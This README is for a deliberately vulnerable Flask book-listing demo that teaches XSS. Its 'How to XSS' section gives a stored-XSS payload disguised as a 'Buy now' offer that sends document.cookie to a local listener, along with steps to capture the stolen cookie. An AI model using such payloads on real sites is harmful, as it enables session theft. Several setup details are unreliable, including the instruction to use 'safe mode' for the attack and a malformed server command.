# Flask Books XSS

## Running manually
### Requirements
* Python 3.11 or 3.12
* Poetry 2 (`pip install poetry`)

1. Install dependencies
```bash
poetry install
```

2. Create .env file like `example.env`

3. Run project

```bash
poetry run booksxss
# Or
poetry run flask --app flask_books_xss.app run
```

## Running in Docker

1. Build

```bash
docker build -t books-xss:latest
```

2. Run (in vulnerable mode)

```bash
docker run --rm -p 8080:5000 -e VULNERABLE_MODE=true books-xss:latest
```
-> Access page on http://localhost:8080

3. Run (in safe mode)
```bash
docker run --rm -p 8080:5000 -e VULNERABLE_MODE=false books-xss:latest
```

-> Access page on http://localhost:8080

## How to XSS (fetch cookies)

1. Run app in safe mode (as described previously)

2. As an example, paste this into the Title field:

```html
<div style="padding:8px;border:1px solid #cc0000;background:#fff7f7">
  <strong>🔥 Limited offer:</strong>
  <button style="padding:6px 10px;border:0;background:#0070f3;color:#fff;cursor:pointer"
    onclick='(function(){
		fetch("http://127.0.0.1:4000/steal?c=" + encodeURIComponent(document.cookie));	
          })()'>
    Buy now
  </button>
</div>
```

3. Open an external command-line session

4. Run `python -m http.server -port 4000`

5. On the web app, click "buy now" which will trigger the cookie fetching

6. Look at your command-line terminal, which should have logged a request with cookie information in the URL

## Project layout

```bash
flask-books-xss/
├─ pyproject.toml                 # Poetry 2 (PEP 621)
├─ flask_books_xss/
│  ├─ __init__.py                 # app factory, env parsing
│  ├─ app.py                      # CLI entry (exposes `app`)
│  ├─ db.py / storage.py          # SQLAlchemy + helpers
│  ├─ routes.py                   # web blueprint
│  └─ templates/
│     └─ index.html               # uses {{ vulnerable }} flag
└─ (instance/)                    # created at runtime for SQLite

```